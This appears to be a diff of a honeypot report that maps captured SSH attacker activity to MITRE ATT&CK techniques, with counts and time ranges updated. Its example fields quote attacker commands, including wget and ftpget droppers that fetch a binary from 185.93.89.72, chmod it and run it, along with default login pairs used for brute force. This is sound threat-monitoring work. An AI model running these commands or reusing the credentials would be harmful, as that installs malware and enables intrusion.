@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-09 02:04:11",
+  "generated": "2026-09-09 03:04:20",
   "totals": {
-    "commands": 402,
-    "login_failed": 169,
-    "login_success": 126,
-    "sessions": 178
+    "commands": 943,
+    "login_failed": 361,
+    "login_success": 298,
+    "sessions": 373
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 169,
+      "count": 361,
       "examples": [
         "admin / admin",
         "root / root",
@@ -21,14 +21,14 @@
         "linuxshell / enablelinuxshell"
       ],
       "first": "2026-09-09T00:03:10.052346Z",
-      "last": "2026-09-09T01:59:55.587526Z",
-      "unique_ips": 12
+      "last": "2026-09-09T03:02:53.746336Z",
+      "unique_ips": 15
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 126,
+      "count": 298,
       "examples": [
         "root / root",
         "ubuntu / Oracle",
@@ -37,14 +37,14 @@
         "ftpuser / ftpuser"
       ],
       "first": "2026-09-09T00:03:10.740292Z",
-      "last": "2026-09-09T01:59:56.646791Z",
-      "unique_ips": 6
+      "last": "2026-09-09T02:47:09.931048Z",
+      "unique_ips": 10
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 15,
+      "count": 30,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,28 +53,28 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-09T00:03:11.283737Z",
-      "last": "2026-09-09T00:03:48.179136Z",
-      "unique_ips": 1
+      "last": "2026-09-09T02:09:51.285689Z",
+      "unique_ips": 2
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 8,
+      "count": 9,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "sudo -n whoami 2>/dev/null",
         "sudo -S whoami 2>/dev/null"
       ],
       "first": "2026-09-09T00:03:12.667622Z",
-      "last": "2026-09-09T00:08:08.694798Z",
-      "unique_ips": 2
+      "last": "2026-09-09T02:09:14.862052Z",
+      "unique_ips": 3
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 4,
+      "count": 8,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -82,61 +82,65 @@
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
       ],
       "first": "2026-09-09T00:03:12.667622Z",
-      "last": "2026-09-09T00:03:48.179136Z",
-      "unique_ips": 1
+      "last": "2026-09-09T02:09:51.285689Z",
+      "unique_ips": 2
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 1,
+      "count": 3,
       "examples": [
         "uname -a"
       ],
       "first": "2026-09-09T00:39:03.052905Z",
-      "last": "2026-09-09T00:39:03.052905Z",
-      "unique_ips": 1
+      "last": "2026-09-09T02:15:56.997205Z",
+      "unique_ips": 3
     }
   ],
   "unmapped": [
     [
       "system",
-      122
+      292
     ],
     [
       "shell",
-      122
+      292
     ],
     [
       "sh",
-      122
+      292
     ],
     [
       "/bin/busybox",
-      7
+      14
     ],
     [
       "enable",
-      1
+      2
     ],
     [
       "linuxshell",
-      1
+      2
     ],
     [
       "enablelinuxshell",
-      1
+      2
     ],
     [
       "ping ;sh",
-      1
+      2
     ],
     [
       "busybox",
-      1
+      2
     ],
     [
       "cd /proc && cat self/cmdline",
+      2
+    ],
+    [
+      "/bin/busybox UNSTABLE",
       1
     ]
   ]
